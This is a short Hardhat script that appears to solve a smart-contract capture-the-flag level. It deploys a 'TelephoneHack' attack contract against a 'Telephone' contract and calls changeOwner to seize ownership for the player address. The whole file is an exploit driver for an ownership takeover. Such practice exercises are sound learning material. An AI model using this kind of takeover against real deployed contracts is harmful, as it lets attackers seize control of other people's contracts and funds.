import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x7B6fCB97Fc1B74e16CBe577054a4426d3487837C"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Telephone", CONTRACT_ADDRESS, signer)

    const TelephoneAttackContract = await ethers.getContractFactory("TelephoneHack", signer)
    const telephoneAttackContract = await TelephoneAttackContract.deploy(CONTRACT_ADDRESS)
    await telephoneAttackContract.deployed()

    console.log("Attack contract deployed at: ", telephoneAttackContract.address);

    await telephoneAttackContract.changeOwner(PLAYER_ADDRESS)

    const newOwner = await contract.owner()
    console.log("contract bridged: ", newOwner == PLAYER_ADDRESS);


}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});